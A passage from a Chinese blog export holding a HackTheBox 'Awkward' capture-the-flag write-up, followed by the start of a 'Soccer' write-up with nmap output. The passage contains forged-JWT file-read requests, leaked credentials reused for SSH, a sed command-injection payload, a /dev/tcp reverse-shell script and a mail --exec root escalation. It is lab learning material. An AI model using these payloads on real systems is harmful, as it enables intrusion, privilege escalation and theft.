PS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ ' else PS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ ' fi unset color_prompt force_color_prompt # If this is an xterm set the title to user@host:dir case \"$TERM\" in xterm*|rxvt*) PS1=\"\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1\" ;; *) ;; esac # enable color support of ls and also add handy aliases if [ -x /usr/bin/dircolors ]; then test -r ~/.dircolors &amp;&amp; eval \"$(dircolors -b ~/.dircolors)\" || eval \"$(dircolors -b)\" alias ls='ls --color=auto' #alias dir='dir --color=auto' #alias vdir='vdir --color=auto' alias grep='grep --color=auto' alias fgrep='fgrep --color=auto' alias egrep='egrep --color=auto' fi # colored GCC warnings and errors #export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01' # some more ls aliases alias ll='ls -alF' alias la='ls -A' alias l='ls -CF' # custom alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh' # Add an \"alert\" alias for long running commands. Use like so: # sleep 10; alert alias alert='notify-send --urgency=low -i \"$([ $? = 0 ] &amp;&amp; echo terminal || echo error)\" \"$(history|tail -n1|sed -e '\\''s/^\\s*[0-9]\\+\\s*//;s/[;&amp;|]\\s*alert$//'\\'')\"' # Alias definitions. # You may want to put all your additions into a separate file like # ~/.bash_aliases, instead of adding them here directly. # See /usr/share/doc/bash-doc/examples in the bash-doc package. if [ -f ~/.bash_aliases ]; then . ~/.bash_aliases fi # enable programmable completion features (you don't need to enable # this, if it's already enabled in /etc/bash.bashrc and /etc/profile # sources /etc/bash.bashrc). if ! shopt -oq posix; then if [ -f /usr/share/bash-completion/bash_completion ]; then . /usr/share/bash-completion/bash_completion elif [ -f /etc/bash_completion ]; then . /etc/bash_completion fi fi å¤§æ¦‚åœ¨98è¡Œï¼Œçœ‹åˆ°æœ‰ alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh' å°è¯•ç”¨JWTå»è¯»/home/bean/Documents/backup_home.sh â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl http://hat-valley.htb/api/all-leave --header \"Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzc4MjAwNzN9.FeikFTrIWzIe5LAJnPRZGH_Z7B1RLpfKJ4saxf9T74s\" #!/bin/bash mkdir /home/bean/Documents/backup_tmp cd /home/bean tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz . date &gt; /home/bean/Documents/backup_tmp/time.txt cd /home/bean/Documents/backup_tmp tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz . rm -r /home/bean/Documents/backup_tmp çœ‹åˆ°æœ‰/home/bean/Documents/backup/bean_backup_final.tar.gz å†ç”¨JWTå»è¯»ï¼Œå¹¶ä¸”ç”¨curlæŠŠä»–è¾“å‡ºåˆ°æœ¬åœ° â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl http://hat-valley.htb/api/all-leave --header \"Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY3NzgyMDA3M30.wArGs4nDtEexKppqgQ1gHSOrq1y91D486JBYTpN4f7E\" --output bean_backup_final.zip % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 31716 100 31716 0 0 20265 0 0:00:01 0:00:01 --:--:-- 20265 unzipä¸è¡Œï¼Œç›´æ¥åŒå‡»æ‰“å¼€ï¼ŒæŠŠæ–‡ä»¶æ‹–å‡ºæ¥ï¼Œä¾æ¬¡å¾—åˆ°å¦‚ä¸‹å›¾æ–‡ä»¶ è§£å‹bean_backup.tar.gzå¾—åˆ°ä»¥ä¸‹æ–‡ä»¶ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/bean_backup] â””â”€# ls -la total 72 drwxr-x--- 15 1001 1001 4096 Sep 15 07:45 . drwxr-x--- 3 1001 1001 4096 Mar 3 04:19 .. lrwxrwxrwx 1 1001 1001 9 Sep 15 07:40 .bash_history -&gt; /dev/null -rw-r--r-- 1 1001 1001 220 Sep 15 07:34 .bash_logout -rw-r--r-- 1 1001 1001 3847 Sep 15 07:45 .bashrc drwx------ 12 1001 1001 4096 Sep 15 07:41 .config drwxr-xr-x 2 1001 1001 4096 Sep 15 07:35 Desktop drwxr-xr-x 4 1001 1001 4096 Sep 15 07:46 Documents drwxr-xr-x 2 1001 1001 4096 Sep 15 07:35 Downloads drwx------ 2 1001 1001 4096 Sep 15 07:36 .gnupg drwx------ 3 1001 1001 4096 Sep 15 07:35 .local drwxr-xr-x 2 1001 1001 4096 Sep 15 07:35 Music drwxr-xr-x 2 1001 1001 4096 Sep 15 07:35 Pictures -rw-r--r-- 1 1001 1001 807 Sep 15 07:34 .profile drwxr-xr-x 2 1001 1001 4096 Sep 15 07:35 Public drwx------ 3 1001 1001 4096 Sep 15 07:35 snap drwx------ 2 1001 1001 4096 Sep 15 07:36 .ssh drwxr-xr-x 2 1001 1001 4096 Sep 15 07:35 Templates drwxr-xr-x 2 1001 1001 4096 Sep 15 07:35 Videos åœ¨.config/xpad/content-DS1ZS1æ–‡ä»¶é‡Œå‘ç°ä¸€å¯¹ç–‘ä¼¼ç”¨æˆ·åå¯†ç çš„ä¸œè¥¿ï¼Œæœ€åè¿˜æœ‰ä¸€å¥ï¼ŒMAKE SURE TO USE THIS EVERYWHEREï¼Œçœ‹æ¥è¿™ä¸ªè´¦æˆ·å¯†ç ä¼šä¸æ­¢ä¸€æ¬¡ç”¨åˆ°ï¼Œç”±æ­¤å¯è§ï¼Œè‹¥æ˜¯åœ¨çœŸå®æ¸—é€ï¼Œå‰æœŸæ”¶é›†çš„èµ„äº§å¯èƒ½åæœŸè¿˜ä¼šç”¨åˆ°ï¼Œæ•´ç†å¥½èµ„äº§ï¼ bean.hill #è¿æ¥sshæ—¶å‘ç°ç”¨æˆ·åæ˜¯bean 014mrbeanrules!#P SSHè¿ä¸Šå» æƒé™æå‡æŸ¥çœ‹hostæ–‡ä»¶ bean@awkward:~$ cat /etc/hosts 127.0.0.1 localhost hat-valley.htb store.hat-valley.htb 127.0.0.1 awkward # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters å‘ç°æ–°å­åŸŸåï¼Œæ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶ï¼Œè®¿é—®ï¼Œå‘ç°è¦ç”¨æˆ·åå¯†ç  store.hat-valley.htb ç½‘ç«™æ˜¯nginxæœåŠ¡å™¨ï¼ŒnginxæœåŠ¡å™¨çš„é»˜è®¤ç”¨æˆ·åå¯†ç é€šå¸¸åœ¨/etc/nginx/conf.d/.htaccessï¼Œé‚£ä¹ˆæˆ‘ä»¬å°è¯•è®¿é—®ï¼Œä½†è®¿é—®ä¸åˆ°ï¼Œå‘ç°æœ‰/etc/nginx/conf.d/.htpasswd bean@awkward:~$ cat /etc/nginx/conf.d/.htpasswd admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1 hashå°è¯•å„ç§çˆ†ç ´æ— æœï¼Œæƒ³èµ·ä¹‹å‰çš„MAKE SURE TO USE THIS EVERYWHEREï¼Œå°è¯•å„ç§ç»„åˆä¹‹åï¼Œå‘ç°ç”¨æˆ·åæ˜¯adminï¼Œå¯†ç æ˜¯beanç”¨æˆ·çš„å¯†ç ï¼ŒæˆåŠŸç™»å…¥ ç»æŸ¥æ‰¾ï¼Œç«™ç‚¹æºç åœ¨/var/www/storeç›®å½•ä¸‹ bean@awkward:/var/www/store$ ls -la total 104 drwxr-xr-x 9 root root 4096 Oct 6 01:35 . drwxr-xr-x 7 root root 4096 Oct 6 01:35 .. drwxrwxrwx 2 root root 4096 Mar 3 21:30 cart -rwxr-xr-x 1 root root 3664 Sep 15 20:09 cart_actions.php -rwxr-xr-x 1 root root 12140 Sep 15 20:09 cart.php -rwxr-xr-x 1 root root 9143 Sep 15 20:09 checkout.php drwxr-xr-x 2 root root 4096 Oct 6 01:35 css drwxr-xr-x 2 root root 4096 Oct 6 01:35 fonts drwxr-xr-x 6 root root 4096 Oct 6 01:35 img -rwxr-xr-x 1 root root 14770 Sep 15 20:09 index.php drwxr-xr-x 3 root root 4096 Oct 6 01:35 js drwxrwxrwx 2 root root 4096 Mar 3 21:50 product-details -rwxr-xr-x 1 root root 918 Sep 15 20:09 README.md -rwxr-xr-x 1 root root 13731 Sep 15 20:09 shop.php drwxr-xr-x 6 root root 4096 Oct 6 01:35 static -rwxr-xr-x 1 root root 695 Sep 15 20:09 style.css æŸ¥çœ‹README.md æœ‰å‡ ä¸ªä¿¡æ¯ æ²¡æœ‰æ•°æ®åº“ï¼Œåªæœ‰ç¦»çº¿æ–‡ä»¶ /product-detailså­˜å‚¨äº§å“ä¿¡æ¯ /cartå­˜å‚¨ç”¨æˆ·çš„è´­ç‰©è½¦ä¿¡æ¯ï¼Œå¹¶ä¸”æ ¹æ®ç”¨æˆ·çš„session IDå‘½å bean@awkward:/var/www/store$ cat README.md # Hat Valley - Shop Online! ### To Do 1. Waiting for SQL database to be setup, using offline files for now, will merge with database once it is setup 2. Implement checkout system, link with credit card system (Stripe??) 3. Implement shop filter 4. Get full catalogue of items ### How to Add New Catalogue Item 1. Copy an existing item from /product-details and paste it in the same folder, changing the name to reflect a new product ID 2. Change the fields to the appropriate values and save the file. -- NOTE: Please leave the header on first line! This is used to verify it as a valid Hat Valley product. -- ### Hat Valley Cart Right now, the user's cart is stored within /cart, and is named according to the user's session ID. All products are appended to the same file for each user. To test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website! æŸ¥çœ‹cart_actions.php &lt;?php $STORE_HOME = \"/var/www/store/\"; //check for valid hat valley store item function checkValidItem($filename) { if(file_exists($filename)) { $first_line = file($filename)[0]; if(strpos($first_line, \"***Hat Valley\") !== FALSE) { return true; } } return false; } //add to cart if ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; $_POST['action'] === 'add_item' &amp;&amp; $_POST['item'] &amp;&amp; $_POST['user']) { $item_id = $_POST['item']; $user_id = $_POST['user']; $bad_chars = array(\";\",\"&amp;\",\"|\",\"&gt;\",\"&lt;\",\"*\",\"?\",\"`\",\"$\",\"(\",\")\",\"{\",\"}\",\"[\",\"]\",\"!\",\"#\"); //no hacking allowed!! foreach($bad_chars as $bad) { if(strpos($item_id, $bad) !== FALSE) { echo \"Bad character detected!\"; exit; } } foreach($bad_chars as $bad) { if(strpos($user_id, $bad) !== FALSE) { echo \"Bad character detected!\"; exit; } } if(checkValidItem(\"{$STORE_HOME}product-details/{$item_id}.txt\")) { if(!file_exists(\"{$STORE_HOME}cart/{$user_id}\")) { system(\"echo '***Hat Valley Cart***' &gt; {$STORE_HOME}cart/{$user_id}\"); } system(\"head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 &gt;&gt; {$STORE_HOME}cart/{$user_id}\"); echo \"Item added successfully!\"; } else { echo \"Invalid item\"; } exit; } //delete from cart if ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; $_POST['action'] === 'delete_item' &amp;&amp; $_POST['item'] &amp;&amp; $_POST['user']) { $item_id = $_POST['item']; $user_id = $_POST['user']; $bad_chars = array(\";\",\"&amp;\",\"|\",\"&gt;\",\"&lt;\",\"*\",\"?\",\"`\",\"$\",\"(\",\")\",\"{\",\"}\",\"[\",\"]\",\"!\",\"#\"); //no hacking allowed!! foreach($bad_chars as $bad) { if(strpos($item_id, $bad) !== FALSE) { echo \"Bad character detected!\"; exit; } } foreach($bad_chars as $bad) { if(strpos($user_id, $bad) !== FALSE) { echo \"Bad character detected!\"; exit; } } if(checkValidItem(\"{$STORE_HOME}cart/{$user_id}\")) { system(\"sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}\"); echo \"Item removed from cart\"; } else { echo \"Invalid item\"; } exit; } //fetch from cart if ($_SERVER['REQUEST_METHOD'] === 'GET' &amp;&amp; $_GET['action'] === 'fetch_items' &amp;&amp; $_GET['user']) { $html = \"\"; $dir = scandir(\"{$STORE_HOME}cart\"); $files = array_slice($dir, 2); foreach($files as $file) { $user_id = substr($file, -18); if($user_id === $_GET['user'] &amp;&amp; checkValidItem(\"{$STORE_HOME}cart/{$user_id}\")) { $product_file = fopen(\"{$STORE_HOME}cart/{$file}\", \"r\"); $details = array(); while (($line = fgets($product_file)) !== false) { if(str_replace(array(\"\\r\", \"\\n\"), '', $line) !== \"***Hat Valley Cart***\") { //don't include first line array_push($details, str_replace(array(\"\\r\", \"\\n\"), '', $line)); } } foreach($details as $cart_item) { $cart_items = explode(\"&amp;\", $cart_item); for($x = 0; $x &lt; count($cart_items); $x++) { $cart_items[$x] = explode(\"=\", $cart_items[$x]); //key and value as separate values in subarray } $html .= \"&lt;tr&gt;&lt;td&gt;{$cart_items[1][1]}&lt;/td&gt;&lt;td&gt;{$cart_items[2][1]}&lt;/td&gt;&lt;td&gt;{$cart_items[3][1]}&lt;/td&gt;&lt;td&gt;&lt;button data-id={$cart_items[0][1]} onclick=\\\"removeFromCart(this, localStorage.getItem('user'))\\\" class='remove-item'&gt;Remove&lt;/button&gt;&lt;/td&gt;&lt;/tr&gt;\"; } } } echo $html; exit; } ?&gt; RCEå®¡è®¡ï¼Œå…¶ä¸­åœ¨åˆ é™¤è´­ç‰©è½¦ä¿¡æ¯çš„æ—¶å€™ï¼Œä¼šæ‰§è¡Œå¦‚ä¸‹ä»£ç  system(\"sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}\"); æ³¨ï¼š '/item_id={$item_id}/d' #åˆ é™¤item_id={$item_id}çš„è¡Œ -i {$STORE_HOME}cart/{$user_id} #è¡¨ç¤ºè¦æ“ä½œçš„ç›®æ ‡æ–‡ä»¶ æˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸€ä¸ªå•†å“åˆ°è´­ç‰©è½¦ï¼Œåˆ†æä¸€ä¸‹è¿‡ç¨‹ã€‚å¦‚ä¸‹å›¾ç‚¹å‡»ADD TO CART ç„¶ååˆ°beanç”¨æˆ·çš„sshçª—å£æŸ¥çœ‹/var/www/store/cartï¼ˆç”±ä¸Šé¢çš„README.mdæ–‡ä»¶æˆ–è€…cart_actions.phpå¯ä»¥åˆ†æå‡ºè¿™ä¸ªè·¯å¾„ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°æ–‡ä»¶åä¸º959e-8a52-2e0-fc52ï¼Œä¹Ÿå°±æ˜¯$user_idçš„å€¼ï¼Œæ–‡ä»¶å†…å®¹é‡Œitem_id=1 bean@awkward:/var/www/store/cart$ ls 959e-8a52-2e0-fc52 bean@awkward:/var/www/store/cart$ cat 959e-8a52-2e0-fc52 ***Hat Valley Cart*** item_id=1&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90 ä»£ç ä¸­item_id=1ä¼šè¢«ä»£å…¥sedå‘½ä»¤æ‰§è¡Œï¼Œè™½ç„¶æœ‰è¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥é—­åˆç»•è¿‡ï¼Œè¿™é‡Œå°±æ˜¯å¯æ“ä½œçš„åœ°æ–¹ã€‚ç»è¿‡æµ‹è¯•ï¼Œå¯¹äºåŒä¸€ä¸ªç”¨æˆ·$user_idçš„å€¼ä¸ä¼šå˜ï¼Œè€Œä¸”beanæ²¡æœ‰ä¿®æ”¹è´­ç‰©è½¦æ–‡ä»¶çš„æƒé™ï¼Œä½†æ˜¯å¯ä»¥å…ˆåˆ é™¤ï¼Œç„¶åé‡æ–°å†™ä¸€ä¸ªç›¸åŒæ–‡ä»¶åçš„æ–‡ä»¶ï¼Œå¦‚ä¸‹ bean@awkward:/var/www/store$ rm -rf cart/959e-8a52-2e0-fc52 bean@awkward:/var/www/store$ nano cart/959e-8a52-2e0-fc52 bean@awkward:/var/www/store$ cat cart/959e-8a52-2e0-fc52 ***Hat Valley Cart*** item_id=1' -e \"1e /tmp/shell.sh\" /tmp/shell.sh '&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90 æ„é€ payloadå¯å‚è€ƒï¼šhttps://gtfobins.github.io/gtfobins/sed/ æˆ‘ä»¬æ„é€ çš„payloadåŠæœ€ç»ˆä»£å…¥sedå‘½ä»¤çš„æ•ˆæœå¦‚ä¸‹ item_id=1' -e \"1e /tmp/shell.sh\" /tmp/shell.sh ' sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id} sed -i '1' -e \"1e /tmp/shell.sh\" /tmp/shell.sh '' /var/www/store/cart/959e-8a52-2e0-fc52 æ³¨ï¼š -e&lt;script&gt;æˆ–--expression=&lt;script&gt;è¡¨ç¤ºä»¥é€‰é¡¹ä¸­æŒ‡å®šçš„scriptæ¥å¤„ç†è¾“å…¥çš„æ–‡æœ¬æ–‡ä»¶ æ²¡æœ‰vimï¼Œé‚£å°±ç”¨nanoåœ¨/tmpç›®å½•å†™å…¥åå¼¹shellæ–‡ä»¶shell.shï¼Œå¹¶æ·»åŠ å¯æ‰§è¡Œæƒé™ bean@awkward:/tmp$ nano shell.sh bean@awkward:/tmp$ cat shell.sh #!/bin/bash bash -i &gt;&amp; /dev/tcp/[æœ¬åœ°IP]/[æƒ³è¦ç›‘å¬çš„PORT] 0&gt;&amp;1 bean@awkward:/tmp$ ls -l shell.sh -rw-rw-r-- 1 bean bean 55 Mar 4 12:29 shell.sh bean@awkward:/tmp$ chmod +x shell.sh bean@awkward:/tmp$ ls -l shell.sh -rwxrwxr-x 1 bean bean 55 Mar 4 12:29 shell.sh å¼€å¯ncç›‘å¬ nc -nvlp 9001 æ‰“å¼€Burpsuiteï¼Œç„¶åæ‰“å¼€å¦‚ä¸‹è´­ç‰©è½¦ç•Œé¢ï¼Œç‚¹å‡»Removeçš„åŒæ—¶æˆªè·è¯·æ±‚ ä¿®æ”¹è¯·æ±‚æ•°æ®å¦‚ä¸‹ item=1'+-e+\"1e+/tmp/shell.sh\"+/tmp/shell.sh+'&amp;user=959e-8a52-2e0-fc52&amp;action=delete_item æ‹¿åˆ°www-dataç”¨æˆ·æƒé™ æœ¬åœ°ä¸‹ä¸€ä¸ªpspy64ï¼Œç„¶åå¼€å¯80æœåŠ¡ç›‘å¬ï¼Œå†ç„¶ååˆ°beanç”¨æˆ·çš„sshçª—å£ç”¨wgetä»æœ¬åœ°ä¸‹è½½pspy64 ç„¶ååœ¨www-dataç”¨æˆ·çª—å£æ‰§è¡Œpspy64ï¼Œçœ‹åˆ°inotifywaitå·¥å…·åœ¨ç›‘å¬/var/www/private/leave_requests.csv æŸ¥çœ‹/var/www/private/leave_requests.csvå†…å®¹å¦‚ä¸‹ï¼Œå¯çœ‹åˆ°æ˜¯Leave Request Database å†çœ‹åˆ°æœ‰mailå‘½ä»¤åœ¨å‘é€é‚®ä»¶ï¼Œæ¨æµ‹æ˜¯ä»Leave Request Databaseè¯»å–ï¼Œç„¶åå‘é€ã€‚mailå‘½ä»¤å¯ä»¥æ‰§è¡Œæ–‡ä»¶ï¼Œå‚è€ƒï¼šhttps://gtfobins.github.io/gtfobins/mail/ æˆ‘ä»¬å¯ä»¥å†™å…¥åå¼¹shellæ–‡ä»¶ æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†æ‰§è¡Œåå¼¹shellçš„å‘½ä»¤å†™å…¥leave_requests.csv www-data@awkward:~/private$ echo '\" --exec=\"\\!/tmp/shell.sh\"' &gt;&gt; leave_requests.csv &lt; '\" --exec=\"\\!/tmp/shell.sh\"' &gt;&gt; leave_requests.csv www-data@awkward:~/private$ ç„¶åå¼€å¯ç›‘å¬ï¼Œç¨ç­‰ç‰‡åˆ»å°±ä¼šæ‹¿åˆ°rootæƒé™ Overï¼ æ€»ç»“ ä¿¡æ¯æ”¶é›†å‘ç°JWTå’ŒSSRFï¼› SSRFå‘ç°ç«™ç‚¹APIï¼› å®¡è®¡APIæºç ï¼Œå‘ç°å¯ä¼ªé€ JWTæ‰§è¡Œawkå‘½ä»¤å®ç°LFIæ‹¿åˆ°beanç”¨æˆ·sshï¼› è¿ä¸Šsshæ‰¾åˆ°è´­ç‰©è½¦æºç ï¼Œnginxæ•æ„Ÿæ–‡ä»¶æ³„éœ²æ‰¾åˆ°adminè´¦æˆ·ï¼› å®¡è®¡è´­ç‰©è½¦æºç ï¼Œå‘ç°åˆ é™¤è´­ç‰©è½¦åŠŸèƒ½å¯åˆ©ç”¨sedå‘½ä»¤å®ç°RCEï¼› RCEåå¼¹shellè·å–www-dataç”¨æˆ·æƒé™ï¼› æ‰§è¡Œpspy64å‘ç°mailå‘½ä»¤åŠå…¶ç›®æ ‡æ–‡ä»¶leave_requests.csvï¼› åˆ©ç”¨mailå‘½ä»¤å’Œleave_requests.csvåå¼¹shellè·å–rootæƒé™ã€‚ å‚è€ƒhttps://0xdedinfosec.vercel.app/blog/hackthebox-awkward-writeup#cracking-jwt-secret https://systemweakness.com/hack-the-box-htb-writeup-awkward-3542681d9795 https://gtfobins.github.io/#sed https://gtfobins.github.io/gtfobins/sed/ https://gtfobins.github.io/gtfobins/mail/","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Soccer","slug":"HTB1-Soccer","date":"2023-03-08T06:34:13.000Z","updated":"2023-08-31T07:54:59.471Z","comments":true,"path":"posts/d0709a37.html","link":"","permalink":"https://wa0er.github.io/posts/d0709a37.html","excerpt":"","text":"HTB-Soccerè¯ä¸å¤šè¯´ï¼Œnmapä¸€æŠŠæ¢­ nmap -sC -sV 10.10.11.194 â”Œâ”€â”€(rootğŸ’€kali)-[~/æ¡Œé¢] â””â”€# nmap -sC -sV 10.10.11.194 Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-06 04:01 EST Nmap scan report for 10.10.11.194 Host is up (0.26s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA) | 256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA) |_ 256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soccer.htb/ 9091/tcp open xmltec-xmlmail? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: | HTTP/1.1 400 Bad Request | Connection: close | GetRequest: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src 'none' | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 139 | Date: Mon, 06 Feb 2023 09:01:48 GMT | Connection: close | &lt;!DOCTYPE html&gt; | &lt;html lang=\"en\"&gt; | &lt;head&gt; | &lt;meta charset=\"utf-8\"&gt; | &lt;title&gt;Error&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;pre&gt;Cannot GET /&lt;/pre&gt; | &lt;/body&gt; | &lt;/html&gt; | HTTPOptions: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src 'none' | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 143 | Date: Mon, 06 Feb 2023 09:01:49 GMT | Connection: close | &lt;!DOCTYPE html&gt; | &lt;html lang=\"en\"&gt; | &lt;head&gt; | &lt;meta charset=\"utf-8\"&gt; | &lt;title&gt;Error&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt; | &lt;/body&gt; | &lt;/html&gt; | RTSPRequest: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src 'none' | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 143 | Date: Mon, 06 Feb 2023 09:01:50 GMT | Connection: close | &lt;!DOCTYPE html&gt; | &lt;html lang=\"en\"&gt; | &lt;head&gt; | &lt;meta charset=\"utf-8\"&gt; | &lt;title&gt;Error&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt; | &lt;/body&gt; |_ &lt;/html&gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9091-TCP:V=7.91%I=7%D=2/6%Time=63E0C1F6%P=x86_64-pc-linux-gnu%r(inf SF:ormix,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\ SF:n\\r\\n\")%r(drda,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x2 SF:0close\\r\\n\\r\\n\")%r(GetRequest,168,\"HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\n SF:Content-Security-Policy:\\x20default-src\\x20'none'\\r\\nX-Content-Type-Opt SF:ions:\\x20nosniff\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nCon SF:tent-Length:\\x20139\\r\\nDate:\\x20Mon,\\x2006\\x20Feb\\x202023\\x2009:01:48\\x SF:20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang= SF:\\\"en\\\"&gt;\\n&lt;head&gt;\\n&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n&lt;title&gt;Error&lt;/title&gt;\\n&lt;/h SF:ead&gt;\\n&lt;body&gt;\\n&lt;pre&gt;Cannot\\x20GET\\x20/&lt;/pre&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n\")%r(HTT SF:POptions,16C,\"HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Poli SF:cy:\\x20default-src\\x20'none'\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nC SF:ontent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\\r SF:\\nDate:\\x20Mon,\\x2006\\x20Feb\\x202023\\x2009:01:49\\x20GMT\\r\\nConnection:\\ SF:x20close\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en\\\"&gt;\\n&lt;head&gt;\\n&lt;met SF:a\\x20charset=\\\"utf-8\\\"&gt;\\n&lt;title&gt;Error&lt;/title&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n&lt;pre&gt;Ca SF:nnot\\x20OPTIONS\\x20/&lt;/pre&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n\")%r(RTSPRequest,16C,\"HTT SF:P/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Policy:\\x20default-sr SF:c\\x20'none'\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nContent-Type:\\x20t SF:ext/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\\r\\nDate:\\x20Mon,\\x SF:2006\\x20Feb\\x202023\\x2009:01:50\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt; SF:!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en\\\"&gt;\\n&lt;head&gt;\\n&lt;meta\\x20charset=\\\"ut SF:f-8\\\"&gt;\\n&lt;title&gt;Error&lt;/title&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n&lt;pre&gt;Cannot\\x20OPTIONS\\x SF:20/&lt;/pre&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n\")%r(RPCCheck,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\ SF:x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(DNSVersionBindReqTCP,2F, SF:\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r SF:(DNSStatusRequestTCP,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnecti SF:on:\\x20close\\r\\n\\r\\n\")%r(Help,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\ SF:nConnection:\\x20close\\r\\n\\r\\n\")%r(SSLSessionReq,2F,\"HTTP/1\\.1\\x20400\\x2 SF:0Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 49.39 seconds å¼€æ”¾ç«¯å£ï¼š22ï¼ˆSSHï¼‰ã€80ï¼ˆHTTPï¼ŒngnixæœåŠ¡å™¨ï¼‰ã€9091 